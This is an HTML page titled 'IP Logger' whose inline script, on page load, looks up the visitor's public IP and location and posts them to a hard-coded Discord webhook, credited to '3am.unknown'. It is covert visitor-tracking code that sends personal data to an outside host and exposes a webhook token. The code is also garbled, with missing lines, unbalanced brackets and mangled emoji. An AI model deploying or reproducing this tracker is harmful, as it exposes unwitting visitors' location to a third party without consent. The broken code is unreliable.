<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>IP Logger</title>
</head>
<body>
    <script>
        const webhookURL = "https://discord.com/api/webhooks/1335135046633525330/lu2M-H2A36_E_68tGUVcgQnwqInav48znOPlRR6R-_GuFGWyHEdyE4-S32eAArllrh4X";

        fetch('https://api.ipify.org?format=json')

            const embed = {

                    fields: [

                        {
                            name: "üìç Location", 
                            value: 
                                "**City:**\u2003\`" + (info.city || 'N/A') + "\`" +  
                                "\n**Region:**\u2003\`" + (info.region || 'N/A') + "\`" +  
                                "\n**Country:**\u2003\`" + (info.country || 'N/A') + "\`" +

                            inline: false 
                        }


                    ],
                    footer: { text: "IP Tracker | By 3am.unknown" },
                    timestamp: new Date()
                }]
            };

            return fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            });
        })
        .then(() => console.log("‚úÖ IP Info Sent Successfully"))
